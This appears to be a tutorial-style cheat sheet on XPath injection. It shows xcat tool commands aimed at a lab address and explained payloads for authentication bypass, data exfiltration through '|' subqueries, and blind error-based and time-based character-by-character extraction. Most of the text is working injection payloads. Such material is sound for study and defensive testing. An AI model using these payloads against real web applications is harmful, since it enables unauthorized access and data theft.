`XPath` is a language to query specific data in a `XML` file, like how you use `jq` for `json`

# Tools

Install

```sh
pip3 install cython
pip3 install xcat
```

Run

```sh
# Test q parameter
xcat detect http://10.10.10.10/index.php q q=BAR f=fullstreetname --true-string='!No Result'
# Test f parameter
xcat detect http://10.10.10.10/index.php f q=BAR f=fullstreetname --true-string='!No Result'
# Post parameter
xcat detect http://10.10.10.10/index.php username username=admin -m POST --true-string=successfully --encode FORM
# Exfiltrate
xcat run http://10.10.10.10/index.php username username=admin -m POST --true-string=successfully --encode FORM
```

# Auth bypass

Consider the webapp use this query for auth

```php
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . $_POST['password'] . "']";
$results = $xml->xpath($query);
```

And this is the data inside the XML file it is querying

```xml
<users>
	<user>
		<name first="Kaylie" last="Grenvile"/>
		<id>1</id>
		<username>user</username>
		<password>password</password>
	</user>
</users>
```

Now we inject into the query like this to **both username and password field**, it looks like sql injection, but it is not.

```xpath
' or '1'='1
admin' or '1'='1
```

However, most webapp usually **hash the password** before passing it into the query, so if we do the above, **it won't work**.

There are some solution to this:

- Adding another `or`. This, however, might not give us all the privilege we want, since it auth us as the first user

```xpath
' or true() or '
```

- Literate user by their position in the `XML` file. This will get us to the 2nd user stored in the `XML` file

```xpath
' or position()=2 or '
```

- Targeting specific user that we know or guess part of their name, like "admin"

```xpath
' or contains(.,'admin') or '
```

# Data exfil

Imagine the webapp takes in 2 parameter, `q` and `f`. `q` is the query we want to search and `f` is the node selection

```http
GET /index.php?q=Al&f=fullstreetname HTTP/1.1
```

When we query like the above, the statement will be like this.

`a`,`b`,`c` and `d` are just representations since we have no idea what the nodes are

The `contains` function finds the `c` node which has `d` node that contain our input in the `?q` parameter and return the all the `c` nodes that fits.

`/fullstreetname` get the `fullstreetname` node in those nodes

```xpath
/a/b/c/[contains(d/text(), 'Al')]/fullstreetname
```

Now we can try exfiltrate the data

- This will make the predicate becomes universally true, thus matches all nodes at that depth

```xpath
') or ('1'='1
```

```xpath
/a/b/c/[contains(d/text(), '') or ('1'='1')]
```

- With this query, we forcefully making the first query false, thus not returning anything. But we use `|` to use another statement, `//text()`, which will return text data in every node.

```http
GET /index.php?q=')+and+('1'='2&f=fullstreetname+|+//text()
```

```xpath
/a/b/c/[contains(d/text(), '') and ('1'='2')]/fullstreetname | //text()
```

- This query function the same as one above. We make the `contains` function always returns `true`, but change the location to 3 nodes above and get all text data in every node

```http
GET /index.php?q=')+or+('1'='1&f=../../..//text()
```

```xpath
/a/b/c/[contains(d/text(), '') or ('1'='1')]/../../..//text()
```
## Limit

But usually the webapp will not return all data to us, and only limit the first few result, so extracting a whole xml document is impossible

So we first have to figure out the schema depth

- This query make the first statement false and does not return any data. But use `|` to add a subquery. The subquery `/*[1]` starts at the document root `/`, moves one node down the node tree `*`, and selects the first child `[1]`

```http
GET /index.php?q=')+and+('1'='2&f=fullstreetname+|+/*[1]
```

```xpath
/a/b/c/[contains(d/text(), '') and ('1'='2')]/fullstreetname | /*[1]
```

We can continue adding `/*[1]` like `fullstreetname | /*[1]/*[1]/*[1]/*[1]` until it error to determine the schema depth

Then after that, we can start exfiltrate data like this

```
fullstreetname | /*[1]/*[1]/*[1]/*[2]
fullstreetname | /*[1]/*[1]/*[1]/*[3]
fullstreetname | /*[1]/*[1]/*[1]/*[4]
```

If we want to exfiltrate another "table", increment the second position, since the first one is the document root.

```xpath
fullstreetname | /*[1]/*[2]
```

Then repeat the process and start figuring out schema depth, then exfiltrate data

```xpath
fullstreetname | /*[1]/*[2]/*[1]/*[1]
fullstreetname | /*[1]/*[2]/*[1]/*[2]
fullstreetname | /*[1]/*[2]/*[1]/*[3]
```

## Blind Injection - Error-based

These functions are critical in blind XPath injection:

- `name()`: returns the name of the node where it was called
- `substring()`: allows us to exfiltrate the name of a node one character at a time
- `string-length()`: returns the length of a string
- `count()`: returns the number of children of an element node

**Exfiltrate node name**:

- First, we get the name's length. This query test if the first node's name's length is equal to 1. We can also use `> >= < <=`. Fuzz this value to get the right length

```xpath
' or string-length(name(/*[1]))=1 and '1'='1
```

- After fuzzing and getting the length, we can brute force 1 character at a time. This query test if the first character (substring starts at position 1, length 1) is 'a'. Fuzz this to get 1 character at a time

```xpath
' or substring(name(/*[1]),1,1)='a' and '1'='1
```

**Exfiltrate number of child node**:

- After getting the node's name, we can get number of child node with `count()`. This query test if the number of child node is equal to 1

```xpath
' or count(/users/*)=1 and '1'='1
```

**Exfiltrate data**:

- First, we get the length of `username` by fuzzing it

```xpath
' or string-length(/users/user[1]/username)=1 and '1'='1
```

- Then we fuzz the username one character at a time

```xpath
' or substring(/users/user[1]/username,1,1)='a' and '1'='1
```

## Blind Injection - Time-based
XPath does not have `sleep` function or anything like that. But we can do time based by comparing the processing time. Not exactly reliable, but exploitable

The  procedure is kinda the same as error based, but now we use `count((//.)[count((//.))])` to make the webapp iterate all over the `XML` document. We can also stack more `count` to make it take more time, so more reliable.

So this is how it works:

- If the condition `substring(/users/user[1]/username,1,1)='a'` is `true`, the second part of the `and` clause needs to be evaluated, causing significant processing time.
- If the initial condition is `false`, the second part of the `and` clause does not need to be evaluated since the predicate will return `false` no matter what the second part evaluates.

```xpath
' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1
```